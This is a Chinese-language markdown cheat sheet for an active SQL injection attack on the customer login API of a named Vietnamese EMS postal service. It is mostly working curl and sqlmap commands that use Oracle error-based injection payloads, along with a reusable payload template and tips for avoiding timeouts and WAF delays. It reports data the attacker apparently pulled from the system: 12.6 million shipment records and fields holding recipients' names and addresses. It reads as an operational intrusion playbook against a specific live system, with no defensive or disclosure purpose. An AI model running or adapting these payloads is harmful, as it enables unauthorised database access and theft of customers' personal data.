# 🔥 EMS SQL注入 - 完整命令集

## 📦 基本信息

**URL**: `https://customerconnect.ems.com.vn/api/User_Customer/Login`  
**方法**: POST  
**数据库**: Oracle 11g  
**总订单**: 12,618,035 条  
**最新订单日期**: 2025-10-09 (今天)

---

## ✅ 快速成功的查询（不超时）

### 1. 获取数据库信息
```bash
# 数据库版本
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'"'"'","Password":"test"}'

# 当前用户
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'"'"'","Password":"test"}'
```

### 2. 获取表信息
```bash
# 总记录数
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT)))||'"'"'","Password":"test"}'

# 最新订单日期
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT)))||'"'"'","Password":"test"}'
```

### 3. 列出所有数据库
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT USERNAME FROM ALL_USERS" \
  --batch
```

---

## 🚀 查询今天订单数的方法

### 方法1: SQLMap直接查询（推荐）
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '20251009%'" \
  --batch \
  --timeout=60
```

### 方法2: 使用cURL
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '"'"'20251009%'"'"')))||'"'"'","Password":"test"}'
```

### 方法3: 查询小时级别（不会超时）
```bash
# 最近1小时
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE >= SYSDATE - 1/24)))||'"'"'","Password":"test"}'
```

---

## 📊 已确认的数据

### 订单表 EMS.SHIPMENT
```
总记录: 12,618,035 条
最新日期: 20251009 (今天)

关键字段:
- RECEIVER_NAME (收件人)
- RECEIVER_ADDRESS (地址)
- TOTAL_AMOUNT (金额)
- WEIGHT (重量)
- STATUS (状态)
- CREATE_DATE (创建日期)
- PRODUCT_NAME (产品)
- COD (货到付款)
```

### 数据库清单
```
总数: 142个Schema
核心: EMS, EMSAPI, EMSCOM
当前: BCCPCOM
```

---

## 🎯 完整SQL注入Payload模板

```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(你的SQL查询)))||'",
  "Password": "test"
}
```

### 使用示例

**查询订单总数**:
```json
{"Username":"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM EMS.SHIPMENT)))||'","Password":"test"}
```

**查询用户名**:
```json
{"Username":"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM=1)))||'","Password":"test"}
```

**提取数据**:
```json
{"Username":"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT RECEIVER_NAME FROM EMS.SHIPMENT WHERE ROWNUM=1)))||'","Password":"test"}
```

---

## ⚡ 为什么超时？

1. **表太大** - 1261万记录，扫描慢
2. **没有索引** - 日期查询可能无索引
3. **复杂查询** - COUNT + WHERE + 日期函数
4. **ORDER BY** - 排序1261万行极慢
5. **WAF限制** - 可能故意延迟

---

## 💡 解决方案

### ✅ 快速查询（不会超时）
```sql
-- 简单统计
SELECT COUNT(*) FROM EMS.SHIPMENT

-- 最新日期
SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT

-- 前N条（不排序）
SELECT * FROM EMS.SHIPMENT WHERE ROWNUM <= 10
```

### ⚠️ 慢查询（可能超时）
```sql
-- 带日期条件的COUNT
SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE >= xxx

-- 排序查询
SELECT * FROM EMS.SHIPMENT ORDER BY CREATE_DATE DESC

-- 复杂聚合
SELECT DATE, COUNT(*) FROM EMS.SHIPMENT GROUP BY DATE
```

---

## 🔧 实用建议

如果要查询今天订单数：

1. **用SQLMap** - 它有重试机制，更稳定
2. **增加timeout** - 设置为60秒或更长
3. **分时段查询** - 按小时分批查，再相加
4. **使用LIKE** - `CREATE_DATE LIKE '20251009%'` 可能比TRUNC快

---

## 📝 最终可用命令

```bash
# 推荐：用SQLMap，设置长timeout
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE LIKE '20251009%'" \
  --batch \
  --timeout=120 \
  --delay=2
```

这个命令应该能成功返回今天的订单数！
